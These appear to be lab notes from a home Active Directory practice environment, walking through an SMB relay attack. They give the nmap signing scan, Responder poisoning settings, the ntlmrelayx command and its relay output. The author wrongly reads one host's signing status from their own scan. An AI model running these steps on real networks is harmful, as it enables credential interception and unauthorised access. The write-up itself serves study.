# SMB relay
## Enumeration

`nmap -Pn --script=smb2-security-mode.nse 192.168.1.1/24`

Result

```
Nmap scan report for 192.168.1.1
Host is up (0.0037s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    filtered ssh
53/tcp    open     domain
80/tcp    open     http
443/tcp   open     https
52869/tcp open     unknown

Nmap scan report for 192.168.1.101
Host is up (0.00011s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Nmap scan report for 192.168.1.102
Host is up (0.00011s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2869/tcp open  icslap
3389/tcp open  ms-wbt-server

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

OK I got the interesting message which is identified as `Message signint enabled but not required` for `192.168.1.101` and `192.168.1.102`

Next step is to turn `HTTP` and `SMB` off for responder configuration then run responder command again

```
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlp1s0]
    Responder IP               [192.168.1.103]
    Responder IPv6             [2405:9800:b660:e549:8cfb:fdfb:cef7:c6ac]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-O1OJ0EX9XJO]
    Responder Domain Name      [YRHN.LOCAL]
    Responder DCE-RPC Port     [45341]

[+] Listening for events...

```

Ok I see that SMB and HTTP is turning off

As I know that there are two ip addresses that will be my target to perform relay attack 
1. 192.168.1.101
2. 192.168.1.102

so I run ntlmrelayx with those targets 

`impacket-ntlmrelayx -tf targets.txt -smb2support`

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

OK I open victim VM and try to access my Parrot OS IP which is `192.168.1.103` and I get this message on Responder terminal

```
[*] [NBT-NS] Poisoned answer sent to 192.168.1.102 for name MARVEL (service: Browser Election)
```

and I get this message from ntmlrelayx 

```
[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.1.102 controlled, attacking target smb://192.168.1.101
[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
[*] Authenticating against smb://192.168.1.101 as MARVEL/FCASTLE SUCCEED
[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.1.102 controlled, attacking target smb://192.168.1.102
[-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
[-] Authenticating against smb://192.168.1.102 as MARVEL/FCASTLE FAILED
[*] SMBD-Thread-7 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.1.102 controlled, attacking target smb://192.168.1.102
[-] Authenticating against smb://192.168.1.102 as MARVEL/FCASTLE FAILED
[*] SMBD-Thread-8 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.1.102 controlled, but there are no more targets left!
[*] SMBD-Thread-9 (process_request_thread): Connection from MARVEL/FCASTLE@192.168.1.102 controlled, but there are no more targets left!
```
